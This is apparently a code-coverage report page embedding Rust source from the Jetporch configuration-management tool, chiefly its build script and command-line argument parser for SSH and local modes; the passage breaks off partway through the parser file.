<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <style>html, body {
  margin: 0;
  padding: 0;
}

.app {
  margin: 10px;
  padding: 0;
}

.files-list {
  margin: 10px 0 0;
  width: 100%;
  border-collapse: collapse;
}
.files-list__head {
  border: 1px solid #999;
}
.files-list__head > tr > th {
  padding: 10px;
  border: 1px solid #999;
  text-align: left;
  font-weight: normal;
  background: #ddd;
}
.files-list__body {
}
.files-list__file {
  cursor: pointer;
}
.files-list__file:hover {
  background: #ccf;
}
.files-list__file > td {
  padding: 10px;
  border: 1px solid #999;
}
.files-list__file > td:first-child::before {
  content: '\01F4C4';
  margin-right: 1em;
}
.files-list__file_low {
  background: #fcc;
}
.files-list__file_medium {
  background: #ffc;
}
.files-list__file_high {
  background: #cfc;
}
.files-list__file_folder > td:first-child::before {
  content: '\01F4C1';
  margin-right: 1em;
}

.file-header {
  border: 1px solid #999;
  display: flex;
  justify-content: space-between;
  align-items: center;
  position: sticky;
  top: 0;
  background: white;
}

.file-header__back {
  margin: 10px;
  cursor: pointer;
  flex-shrink: 0;
  flex-grow: 0;
  text-decoration: underline;
  color: #338;
}

.file-header__name {
  margin: 10px;
  flex-shrink: 2;
  flex-grow: 2;
}

.file-header__stat {
  margin: 10px;
  flex-shrink: 0;
  flex-grow: 0;
}

.file-content {
  margin: 10px 0 0;
  border: 1px solid #999;
  padding: 10px;
  counter-reset: line;
  display: flex;
  flex-direction: column;
}

.code-line::before {
    content: counter(line);
    margin-right: 10px;
}
.code-line {
  margin: 0;
  padding: 0.3em;
  height: 1em;
  counter-increment: line;
}
.code-line_covered {
  background: #cfc;
}
.code-line_uncovered {
  background: #fcc;
}
</style>
</head>
<body>
    <div id="root"></div>
    <script>
        var data = {"files":[{"path":["/","Users","wings","projects","jetpack","build.rs"],"content":"use std::process::Command;\n\nfn main() {\n    // Populate `src/cli/version.rs` with version info from git,\n    // via shell script.\n    let _ = Command::new(\"./version.sh\")\n        .status()\n        .expect(\"git version shell script should succeed\");\n}\n","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","cli","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\npub mod parser;\npub mod show;\npub mod playbooks;\npub mod version;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","cli","parser.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n//\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n//\n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\n// we don't use any parsing libraries here because they are a bit too automagical\n// this may change later.\n\nuse std::env;\nuse std::fs;\nuse std::vec::Vec;\nuse std::path::PathBuf;\nuse std::sync::{Arc,RwLock};\nuse crate::util::io::directory_as_string;\nuse crate::util::yaml::blend_variables;\nuse crate::inventory::loading::convert_json_vars;\nuse crate::util::io::jet_file_open;\nuse crate::util::yaml::show_yaml_error_in_context;\nuse crate::cli::version::{GIT_VERSION,GIT_BRANCH,BUILD_TIME};\nuse std::path::Path;\nuse std::io;\nuse std::collections::HashMap;\n\n// the CLI parser struct values hold various values calculated when calling parse() on\n// the struct\n\npub struct CliParser {\n    pub playbook_paths: Arc\u003cRwLock\u003cVec\u003cPathBuf\u003e\u003e\u003e,\n    pub inventory_paths: Arc\u003cRwLock\u003cVec\u003cPathBuf\u003e\u003e\u003e,\n    pub role_paths: Arc\u003cRwLock\u003cVec\u003cPathBuf\u003e\u003e\u003e,\n    pub module_paths: Arc\u003cRwLock\u003cVec\u003cPathBuf\u003e\u003e\u003e,\n    pub limit_groups: Vec\u003cString\u003e,\n    pub limit_hosts: Vec\u003cString\u003e,\n    pub inventory_set: bool,\n    pub playbook_set: bool,\n    pub mode: u32,\n    pub needs_help: bool,\n    pub needs_version: bool,\n    pub show_hosts: Vec\u003cString\u003e,\n    pub show_groups: Vec\u003cString\u003e,\n    pub batch_size: Option\u003cusize\u003e,\n    pub default_user: String,\n    pub sudo: Option\u003cString\u003e,\n    pub default_port: i64,\n    pub threads: usize,\n    pub verbosity: u32,\n    pub tags: Option\u003cVec\u003cString\u003e\u003e,\n    pub allow_localhost_delegation: bool,\n    pub extra_vars: serde_yaml::Value,\n    pub forward_agent: bool,\n    pub login_password: Option\u003cString\u003e,\n    pub argument_map: HashMap\u003cString, Arguments\u003e,\n}\n\n// subcommands are usually required\n// FIXME: convert this to an enum\n\npub const CLI_MODE_UNSET: u32 = 0;\npub const CLI_MODE_SYNTAX: u32 = 1;\npub const CLI_MODE_LOCAL: u32 = 2;\npub const CLI_MODE_CHECK_LOCAL: u32 = 3;\npub const CLI_MODE_SSH: u32 = 4;\npub const CLI_MODE_CHECK_SSH: u32 = 5;\npub const CLI_MODE_SHOW: u32 = 6;\npub const CLI_MODE_SIMULATE: u32 = 7;\n\nfn is_cli_mode_valid(value: \u0026String) -\u003e bool {\n    match cli_mode_from_string(value) {\n        Ok(_) =\u003e true,\n        Err(_) =\u003e false,\n    }\n}\n\nfn cli_mode_from_string(s: \u0026String) -\u003e Result\u003cu32, String\u003e {\n    return match s.as_str() {\n        \"local\"           =\u003e Ok(CLI_MODE_LOCAL),\n        \"check-local\"     =\u003e Ok(CLI_MODE_CHECK_LOCAL),\n        \"ssh\"             =\u003e Ok(CLI_MODE_SSH),\n        \"check-ssh\"       =\u003e Ok(CLI_MODE_CHECK_SSH),\n        \"__simulate\"      =\u003e Ok(CLI_MODE_SIMULATE),\n        \"show-inventory\"  =\u003e Ok(CLI_MODE_SHOW),\n        _ =\u003e Err(format!(\"invalid mode: {}\", s))\n    }\n}\n\n// all the supported flags\n\n#[derive(Clone,Debug)]\n#[allow(non_camel_case_types)]\npub enum Arguments {\n    ARGUMENT_VERSION,\n    ARGUMENT_INVENTORY,\n    ARGUMENT_INVENTORY_SHORT,\n    ARGUMENT_PLAYBOOK,\n    ARGUMENT_PLAYBOOK_SHORT,\n    ARGUMENT_ROLES,\n    ARGUMENT_ROLES_SHORT,\n    ARGUMENT_SHOW_GROUPS,\n    ARGUMENT_SHOW_HOSTS,\n    ARGUMENT_LIMIT_GROUPS,\n    ARGUMENT_LIMIT_HOSTS,\n    ARGUMENT_HELP,\n    ARGUMENT_PORT,\n    ARGUMENT_USER,\n    ARGUMENT_USER_SHORT,\n    ARGUMENT_SUDO,\n    ARGUMENT_TAGS,\n    ARGUMENT_ALLOW_LOCALHOST,\n    ARGUMENT_FORWARD_AGENT,\n    ARGUMENT_THREADS,\n    ARGUMENT_THREADS_SHORT,\n    ARGUMENT_BATCH_SIZE,\n    ARGUMENT_VERBOSE,\n    ARGUMENT_VERBOSER,\n    ARGUMENT_VERBOSEST,\n    ARGUMENT_EXTRA_VARS,\n    ARGUMENT_EXTRA_VARS_SHORT,\n    ARGUMENT_ASK_LOGIN_PASSWORD,\n    ARGUMENT_MODULES,\n    ARGUMENT_MODULES_SHORT\n}\n\nimpl Arguments {\n    fn as_str(\u0026self) -\u003e \u0026'static str {\n        match self {\n            Arguments::ARGUMENT_VERSION =\u003e \"--version\",\n            Arguments::ARGUMENT_INVENTORY =\u003e \"--inventory\",\n            Arguments::ARGUMENT_INVENTORY_SHORT =\u003e \"-i\",\n            Arguments::ARGUMENT_PLAYBOOK =\u003e \"--playbook\",\n            Arguments::ARGUMENT_PLAYBOOK_SHORT =\u003e \"-p\",\n            Arguments::ARGUMENT_ROLES =\u003e \"--roles\",\n            Arguments::ARGUMENT_ROLES_SHORT =\u003e \"-r\",\n            Arguments::ARGUMENT_MODULES =\u003e \"--modules\",\n            Arguments::ARGUMENT_MODULES_SHORT =\u003e \"-m\",\n            Arguments::ARGUMENT_SHOW_GROUPS =\u003e \"--show-groups\",\n            Arguments::ARGUMENT_SHOW_HOSTS =\u003e \"--show-hosts\",\n            Arguments::ARGUMENT_LIMIT_GROUPS =\u003e \"--limit-groups\",\n            Arguments::ARGUMENT_LIMIT_HOSTS =\u003e \"--limit-hosts\",\n            Arguments::ARGUMENT_HELP =\u003e \"--help\",\n            Arguments::ARGUMENT_PORT =\u003e \"--port\",\n            Arguments::ARGUMENT_USER =\u003e \"--user\",\n            Arguments::ARGUMENT_USER_SHORT =\u003e \"-u\",\n            Arguments::ARGUMENT_SUDO =\u003e \"--sudo\",\n            Arguments::ARGUMENT_TAGS =\u003e \"--tags\",\n            Arguments::ARGUMENT_ALLOW_LOCALHOST =\u003e \"--allow-localhost-delegation\",\n            Arguments::ARGUMENT_FORWARD_AGENT =\u003e \"--forward-agent\",\n            Arguments::ARGUMENT_THREADS =\u003e \"--threads\",\n            Arguments::ARGUMENT_THREADS_SHORT =\u003e \"-t\",\n            Arguments::ARGUMENT_BATCH_SIZE =\u003e \"--batch-size\",\n            Arguments::ARGUMENT_VERBOSE =\u003e \"-v\",\n            Arguments::ARGUMENT_VERBOSER =\u003e \"-vv\",\n            Arguments::ARGUMENT_VERBOSEST =\u003e \"-vvv\",\n            Arguments::ARGUMENT_EXTRA_VARS =\u003e \"--extra-vars\",\n            Arguments::ARGUMENT_EXTRA_VARS_SHORT =\u003e \"-e\",\n            Arguments::ARGUMENT_ASK_LOGIN_PASSWORD =\u003e \"--ask-login-password\",\n        }\n    }\n}\n\nfn build_argument_map() -\u003e HashMap\u003cString, Arguments\u003e {\n    // this is written backwards mostly for readability\n    let inputs = vec![\n        (Arguments::ARGUMENT_VERSION, \"--version\"),\n        (Arguments::ARGUMENT_INVENTORY, \"--inventory\"),\n        (Arguments::ARGUMENT_INVENTORY_SHORT, \"-i\"),\n        (Arguments::ARGUMENT_PLAYBOOK, \"--playbook\"),\n        (Arguments::ARGUMENT_PLAYBOOK_SHORT, \"-p\"),\n        (Arguments::ARGUMENT_ROLES, \"--roles\"),\n        (Arguments::ARGUMENT_MODULES, \"--modules\"),\n        (Arguments::ARGUMENT_MODULES_SHORT, \"-m\"),\n        (Arguments::ARGUMENT_ROLES_SHORT, \"-r\"),\n        (Arguments::ARGUMENT_SHOW_GROUPS, \"--show-groups\"),\n        (Arguments::ARGUMENT_SHOW_HOSTS, \"--show-hosts\"),\n        (Arguments::ARGUMENT_LIMIT_GROUPS, \"--limit-groups\"),\n        (Arguments::ARGUMENT_LIMIT_HOSTS, \"--limit-hosts\"),\n        (Arguments::ARGUMENT_HELP, \"--help\"),\n        (Arguments::ARGUMENT_PORT, \"--port\"),\n        (Arguments::ARGUMENT_USER, \"--user\"),\n        (Arguments::ARGUMENT_USER_SHORT, \"-u\"),\n        (Arguments::ARGUMENT_SUDO, \"--sudo\"),\n        (Arguments::ARGUMENT_TAGS, \"--tags\"),\n        (Arguments::ARGUMENT_ALLOW_LOCALHOST, \"--allow-localhost-delegation\"),\n        (Arguments::ARGUMENT_FORWARD_AGENT, \"--forward-agent\"),\n        (Arguments::ARGUMENT_THREADS, \"--threads\"),\n        (Arguments::ARGUMENT_THREADS_SHORT, \"-t\"),\n        (Arguments::ARGUMENT_BATCH_SIZE, \"--batch-size\"),\n        (Arguments::ARGUMENT_VERBOSE, \"-v\"),\n        (Arguments::ARGUMENT_VERBOSER, \"-vv\"),\n        (Arguments::ARGUMENT_VERBOSEST, \"-vvv\"),\n        (Arguments::ARGUMENT_EXTRA_VARS, \"--extra-vars\"),\n        (Arguments::ARGUMENT_EXTRA_VARS_SHORT, \"-e\"),\n        (Arguments::ARGUMENT_ASK_LOGIN_PASSWORD, \"--ask-login-password\"),\n    ];\n    let mut map : HashMap\u003cString, Arguments\u003e = HashMap::new();\n    for (e,i) in inputs.iter() {\n        map.insert(i.to_string(), e.clone());\n    }\n    return map\n}\n\n// output from --version\nfn show_version() {\n    let header_table = format!(\"|-|:-\\n\\\n                                |jetp | http://www.jetporch.com/\\n\\\n                                | | (C) Michael DeHaan + contributors, 2023\\n\\\n                                | |\\n\\\n                                | build | {}@{}\\n\\\n                                | | {}\\n\\\n                                | --- | ---\\n\\\n                                | | usage: jetp \u003cMODE\u003e [flags]\\n\\\n                                |-|-\", GIT_VERSION, GIT_BRANCH, BUILD_TIME);\n    println!(\"\");\n    crate::util::terminal::markdown_print(\u0026String::from(header_table));\n    println!(\"\");\n}\n\n// output from --help\n\nfn show_help() {\n\n    show_version();\n\n    let mode_table = \"|:-|:-|:-\\n\\\n                      | *Category* | *Mode* | *Description*\\n\\\n                      | --- | --- | ---\\n\\\n                      | utility: |\\n\\\n                      | | show-inventory | displays inventory, specify --show-groups group1:group2 or --show-hosts host1:host2\\n\\\n                      | |\\n\\\n                      | --- | --- | ---\\n\\\n                      | local machine management: |\\n\\\n                      | | check-local| looks for configuration differences on the local machine\\n\\\n                      | |\\n\\\n                      | | local| manages only the local machine\\n\\\n                      | |\\n\\\n                      | --- | --- | ---\\n\\\n                      | remote machine management: |\\n\\\n                      | | check-ssh | looks for configuration differences over SSH\\n\\\n                      | |\\n\\\n                      | | ssh| manages multiple machines over SSH\\n\\\n                      |-|-\";\n\n    crate::util::terminal::markdown_print(\u0026String::from(mode_table));\n    println!(\"\");\n\n    let flags_table = \"|:-|:-|\\n\\\n                       | *Category* | *Flags* |*Description*\\n\\\n                       | --- | ---\\n\\\n                       | Basics:\\n\\\n                       | | -p, --playbook path1:path2| specifies automation content\\n\\\n                       | |\\n\\\n                       | | -i, --inventory path1:path2| (required for ssh only) specifies which systems to manage\\n\\\n                       | |\\n\\\n                       | | -r, --roles path1:path2| adds additional role search paths. Also uses $JET_ROLES_PATH\\n\\\n                       | |\\n\\\n                       | --- | ---\\n\\\n                       | SSH options:\\n\\\n                       | | --ask-login-password | prompt for the login password on standard input\\n\\\n                       | |\\n\\\n                       | | --batch-size N| fully configure this many hosts before moving to the next batch\\n\\\n                       | |\\n\\\n                       | | --forward-agent | enables SSH agent forwarding but only on specific tasks (ex: git)\\n\\\n                       | |\\n\\\n                       | | --limit-groups group1:group2 | further limits scope for playbook runs\\n\\\n                       | |\\n\\\n                       | | --limit-hosts host1 | further limits scope for playbook runs\\n\\\n                       | |\\n\\\n                       | | --port N | use this default port instead of $JET_SSH_PORT or 22\\n\\\n                       | |\\n\\\n                       | | -t, --threads N| how many parallel threads to use. Alternatively set $JET_THREADS\\n\\\n                       | |\\n\\\n                       | | -u, --user username | use this default username instead of $JET_SSH_USER or $USER\\n\\\n                       | |\\n\\\n                       | --- | ---\\n\\\n                       | Misc options:\\n\\\n                       | | --allow-localhost-delegation | signs off on variable sourcing risks and enables localhost actions with delegate_to\\n\\\n                       | |\\n\\\n                       | | -e, --extra-vars @filename | injects extra variables into the playbook runtime context from a YAML file, or quoted JSON\\n\\\n                       | |\\n\\\n                       | | --sudo username | sudo to this user by default for all tasks\\n\\\n                       | |\\n\\\n                       | | --tags tag1:tag2 | only run tasks or roles with one of these tags\\n\\\n                       | |\\n\\\n                       | | -v -vv -vvv| ever increasing verbosity\\n\\\n                       | |\\n\\\n                       |-|\";\n\n    crate::util::terminal::markdown_print(\u0026String::from(flags_table));\n    println!(\"\");\n\n}\n\n\n\n\nimpl CliParser  {\n\n\n    // construct a parser with empty result values that will be filled in once parsed.\n\n    pub fn new() -\u003e Self {\n\n        let p = CliParser {\n            playbook_paths: Arc::new(RwLock::new(Vec::new())),\n            inventory_paths: Arc::new(RwLock::new(Vec::new())),\n            role_paths: Arc::new(RwLock::new(Vec::new())),\n            module_paths: Arc::new(RwLock::new(Vec::new())),\n            needs_help: false,\n            needs_version: false,\n            mode: CLI_MODE_UNSET,\n            show_hosts: Vec::new(),\n            show_groups: Vec::new(),\n            batch_size: None,\n            default_user: match env::var(\"JET_SSH_USER\") {\n                Ok(x) =\u003e {\n                    println!(\"$JET_SSH_USER: {}\", x);\n                    x\n                },\n                Err(_) =\u003e match env::var(\"USER\") {\n                    Ok(y) =\u003e y,\n                    Err(_) =\u003e String::from(\"root\")\n                }\n            },\n            sudo: None,\n            default_port: match env::var(\"JET_SSH_PORT\") {\n                Ok(x) =\u003e match x.parse::\u003ci64\u003e() {\n                    Ok(i)  =\u003e {\n                        println!(\"$JET_SSH_PORT: {}\", i);\n                        i\n                    },\n                    Err(_) =\u003e { println!(\"environment variable JET_SSH_PORT has an invalid value, ignoring: {}\", x); 22 }\n                },\n                Err(_) =\u003e 22\n            },\n            threads: match env::var(\"JET_THREADS\") {\n                Ok(x) =\u003e match x.parse::\u003cusize\u003e() {\n                        Ok(i)  =\u003e i,\n                        Err(_) =\u003e { println!(\"environment variable JET_THREADS has an invalid value, ignoring: {}\", x); 20 }\n                },\n                Err(_) =\u003e 20\n            },\n            inventory_set: false,\n            playbook_set: false,\n            verbosity: 0,\n            limit_groups: Vec::new(),\n            limit_hosts: Vec::new(),\n            tags: None,\n            allow_localhost_delegation: false,\n            extra_vars: serde_yaml::Value::Mapping(serde_yaml::Mapping::new()),\n            forward_agent: false,\n            login_password: None,\n            argument_map: build_argument_map(),\n        };\n        return p;\n    }\n\n    pub fn show_help(\u0026self) {\n        show_help();\n    }\n\n    pub fn show_version(\u0026self) {\n        show_version();\n    }\n\n    // actual CLI parsing happens here\n\n    pub fn parse(\u0026mut self) -\u003e Result\u003c(), String\u003e {\n\n        let mut arg_count: usize = 0;\n        let mut next_is_value = false;\n\n        // we go through each CLI arg in a loop, certain arguments take\n        // parameters and others do not.\n\n        let args: Vec\u003cString\u003e = env::args().collect();\n        'each_argument: for argument in \u0026args {\n\n            let argument_str = argument.as_str();\n            arg_count = arg_count + 1;\n\n            match arg_count {\n                // the program name doesn't matter\n                1 =\u003e continue 'each_argument,\n\n                // the second argument is the subcommand name\n                2 =\u003e {\n\n                    // we should accept --help anywhere, but this is special\n                    // handling as with --help we don't need a subcommand\n                    if argument == Arguments::ARGUMENT_HELP.as_str() {\n                        self.needs_help = true;\n                        return Ok(())\n                    }\n                    if argument == Arguments::ARGUMENT_VERSION.as_str() {\n                        self.needs_version = true;\n                        return Ok(());\n                    }\n\n                    // if it's not --help, then the second argument is the\n                    // required 'mode' parameter\n                    let _result = self.store_mode(argument)?;\n                    continue 'each_argument;\n                },\n\n                // for the rest of the arguments we need to pay attention to whether\n                // we are reading a flag or a value, which alternate\n                _ =\u003e {\n\n                    if next_is_value == false {\n\n                        // if we expect a flag...\n                        // the --help argument requires special handling as it has no\n                        // following value\n                        if argument_str == Arguments::ARGUMENT_HELP.as_str() {\n                            self.needs_help = true;\n                            return Ok(())\n                        }\n                        if argument_str == Arguments::ARGUMENT_VERSION.as_str() {\n                            self.needs_version = true;\n                            return Ok(())\n                        }\n\n                        let mut standalone_arg_found : bool = true;\n\n                        if ! self.argument_map.contains_key(argument_str) {\n                            return Err(format!(\"unrecognized argument: {}\", argument_str));\n                        } \n                        let arg_enum = self.argument_map.get(argument_str).unwrap().clone();\n\n                        let mut result = match arg_enum {\n                            // all parameters that do not take arguments here\n                            Arguments::ARGUMENT_ALLOW_LOCALHOST    =\u003e self.store_allow_localhost_delegation(),\n                            Arguments::ARGUMENT_FORWARD_AGENT      =\u003e self.store_forward_agent(),\n                            Arguments::ARGUMENT_VERBOSE            =\u003e self.increase_verbosity(1),\n                            Arguments::ARGUMENT_VERBOSER           =\u003e self.increase_verbosity(2),\n                            Arguments::ARGUMENT_VERBOSEST          =\u003e self.increase_verbosity(3),\n                            Arguments::ARGUMENT_ASK_LOGIN_PASSWORD =\u003e self.store_login_password(),\n                            _ =\u003e Ok({ standalone_arg_found = false; next_is_value = true; })\n                        };\n\n                        if ! standalone_arg_found {\n                            if arg_count == args.len() {\n                                return Err(format!(\"missing argument value for {}\", argument_str));    \n                            } \n                            else {\n                                result = match arg_enum {\n                                    // all parameters that do take arguments\n                                    Arguments::ARGUMENT_PLAYBOOK          =\u003e self.append_playbook(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_PLAYBOOK_SHORT    =\u003e self.append_playbook(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_ROLES             =\u003e self.append_roles(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_ROLES_SHORT       =\u003e self.append_roles(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_MODULES           =\u003e self.append_modules(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_MODULES_SHORT     =\u003e self.append_modules(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_INVENTORY         =\u003e self.append_inventory(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_INVENTORY_SHORT   =\u003e self.append_inventory(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_SUDO              =\u003e self.store_sudo(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_TAGS              =\u003e self.store_tags(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_USER              =\u003e self.store_default_user(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_USER_SHORT        =\u003e self.store_default_user(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_SHOW_GROUPS       =\u003e self.store_show_groups(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_SHOW_HOSTS        =\u003e self.store_show_hosts(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_LIMIT_GROUPS      =\u003e self.store_limit_groups(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_LIMIT_HOSTS       =\u003e self.store_limit_hosts(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_BATCH_SIZE        =\u003e self.store_batch_size(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_THREADS           =\u003e self.store_threads(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_THREADS_SHORT     =\u003e self.store_threads(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_PORT              =\u003e self.store_port(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_EXTRA_VARS        =\u003e self.store_extra_vars(\u0026args[arg_count]),\n                                    Arguments::ARGUMENT_EXTRA_VARS_SHORT  =\u003e self.store_extra_vars(\u0026args[arg_count]),\n                                    _  =\u003e Err(format!(\"invalid flag: {}\", argument_str)),\n                                };\n                            }\n                        }\n\n                        if result.is_err() {\n                            return result;\n                        }\n                        \n                    } else {\n                        next_is_value = false;\n                        continue 'each_argument;\n                    }\n                } // end argument numbers 3-N\n            }\n\n\n        }\n\n        // make adjustments based on modes\n        match self.mode {\n            CLI_MODE_LOCAL       =\u003e { self.threads = 1 },\n            CLI_MODE_CHECK_LOCAL =\u003e { self.threads = 1 },\n            CLI_MODE_SYNTAX      =\u003e { self.threads = 1 },\n            CLI_MODE_SHOW        =\u003e { self.threads = 1 },\n            CLI_MODE_UNSET       =\u003e { self.needs_help = true; },\n            _ =\u003e {}\n        }\n\n        if self.playbook_set {\n            self.add_role_paths_from_environment()?;\n            self.add_implicit_role_paths()?;\n            self.add_module_paths_from_environment()?;\n            self.add_implicit_module_paths()?;\n        }\n        Ok(())\n\n    }\n\n    fn store_mode(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n        if is_cli_mode_valid(value) {\n            self.mode = cli_mode_from_string(value).unwrap();\n            return Ok(());\n        }\n        return Err(format!(\"jetp mode ({}) is not valid, see --help\", value))\n     }\n\n    fn append_playbook(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n        self.playbook_set = true;\n        match parse_paths(\u0026String::from(\"-p/--playbook\"), value) {\n            Ok(paths)  =\u003e  { \n                for p in paths.iter() {\n                    if p.is_file() {\n                        let full = std::fs::canonicalize(p.as_path()).unwrap();\n                        self.playbook_paths.write().unwrap().push(full.to_path_buf()); \n                    } else {\n                        return Err(format!(\"playbook file missing: {:?}\", p));\n                    }\n                }\n            },\n            Err(err_msg) =\u003e  return Err(format!(\"--{} {}\", Arguments::ARGUMENT_PLAYBOOK.as_str(), err_msg)),\n        }\n        return Ok(());\n    }\n\n    fn append_roles(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n\n        match parse_paths(\u0026String::from(\"-r/--roles\"), value) {\n            Ok(paths)  =\u003e  { \n                for p in paths.iter() {\n                    if p.is_dir() {\n                        let full = std::fs::canonicalize(p.as_path()).unwrap();\n                        self.role_paths.write().unwrap().push(full.to_path_buf()); \n                    } else {\n                        return Err(format!(\"roles directory not found: {:?}\", p));\n                    }\n                }\n            },\n            Err(err_msg) =\u003e  return Err(format!(\"--{} {}\", Arguments::ARGUMENT_ROLES.as_str(), err_msg)),\n        }\n        return Ok(());\n    }\n\n    fn append_modules(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n\n        match parse_paths(\u0026String::from(\"-m/--modules\"), value) {\n            Ok(paths)  =\u003e  { \n                for p in paths.iter() {\n                    if p.is_dir() {\n                        let full = std::fs::canonicalize(p.as_path()).unwrap();\n                        self.module_paths.write().unwrap().push(full.to_path_buf()); \n                    } else {\n                        return Err(format!(\"modules directory not found: {:?}\", p));\n                    }\n                }\n            },\n            Err(err_msg) =\u003e  return Err(format!(\"--{} {}\", Arguments::ARGUMENT_MODULES.as_str(), err_msg)),\n        }\n        return Ok(());\n    }\n\n    fn append_inventory(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n\n        self.inventory_set = true;\n        if self.mode == CLI_MODE_LOCAL || self.mode == CLI_MODE_CHECK_LOCAL {\n            return Err(format!(\"--inventory cannot be specified for local modes\"));\n        }\n\n        match parse_paths(\u0026String::from(\"-i/--inventory\"),value) {\n            Ok(paths)  =\u003e  { \n                for p in paths.iter() {\n                    self.inventory_paths.write().unwrap().push(p.clone());\n                }\n            }\n            Err(err_msg) =\u003e  return Err(format!(\"--{} {}\", Arguments::ARGUMENT_INVENTORY.as_str(), err_msg)),\n        }\n        return Ok(());\n    }\n\n    fn store_show_groups(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n        match split_string(value) {\n            Ok(values)  =\u003e  { self.show_groups = values; },\n            Err(err_msg) =\u003e  return Err(format!(\"--{} {}\", Arguments::ARGUMENT_SHOW_GROUPS.as_str(), err_msg)),\n        }\n        return Ok(());\n    }\n\n    fn store_show_hosts(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n        match split_string(value) {\n            Ok(values)  =\u003e  { self.show_hosts = values; },\n            Err(err_msg) =\u003e  return Err(format!(\"--{} {}\", Arguments::ARGUMENT_SHOW_HOSTS.as_str(), err_msg)),\n        }\n        return Ok(());\n    }\n\n    fn store_limit_groups(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n        match split_string(value) {\n            Ok(values)  =\u003e  { self.limit_groups = values; },\n            Err(err_msg) =\u003e  return Err(format!(\"--{} {}\", Arguments::ARGUMENT_LIMIT_GROUPS.as_str(), err_msg)),\n        }\n        return Ok(());\n    }\n\n    fn store_limit_hosts(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n        match split_string(value) {\n            Ok(values)  =\u003e  { self.limit_hosts = values; },\n            Err(err_msg) =\u003e  return Err(format!(\"--{} {}\", Arguments::ARGUMENT_LIMIT_HOSTS.as_str(), err_msg)),\n        }\n        return Ok(());\n    }\n\n    fn store_tags(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n        match split_string(value) {\n            Ok(values)  =\u003e  { self.tags = Some(values); },\n            Err(err_msg) =\u003e  return Err(format!(\"--{} {}\", Arguments::ARGUMENT_TAGS.as_str(), err_msg)),\n        }\n        return Ok(());\n    }\n\n    fn store_sudo(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n        self.sudo = Some(value.clone());\n        return Ok(());\n    }\n\n    fn store_default_user(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n        self.default_user = value.clone();\n        return Ok(());\n    }\n\n    fn store_batch_size(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n        if self.batch_size.is_some() {\n            return Err(format!(\"{} has been specified already\", Arguments::ARGUMENT_BATCH_SIZE.as_str()));\n        }\n        match value.parse::\u003cusize\u003e() {\n            Ok(n) =\u003e { self.batch_size = Some(n); return Ok(()); },\n            Err(_e) =\u003e { return Err(format!(\"{}: invalid value\", Arguments::ARGUMENT_BATCH_SIZE.as_str())); }\n        }\n    }\n\n    fn store_threads(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n        match value.parse::\u003cusize\u003e() {\n            Ok(n) =\u003e  { self.threads = n; return Ok(()); }\n            Err(_e) =\u003e { return Err(format!(\"{}: invalid value\", Arguments::ARGUMENT_THREADS.as_str())); }\n        }\n    }\n\n    fn store_port(\u0026mut self, value: \u0026String) -\u003e Result\u003c(), String\u003e {\n        match value.parse::\u003ci64\u003e() {\n            Ok(n) =\u003e  { self.default_port = n; return Ok(()); }\n            Err(_e) =\u003e { return Err(format!(\"{}: invalid value\", Arguments::ARGUMENT_PORT.as_str())); }\n        }\n    }\n\n    fn store_allow_localhost_delegation(\u0026mut self) -\u003e Result\u003c(), String\u003e {\n        self.allow_localhost_delegation = true;\n        Ok(())\n    }\n\n    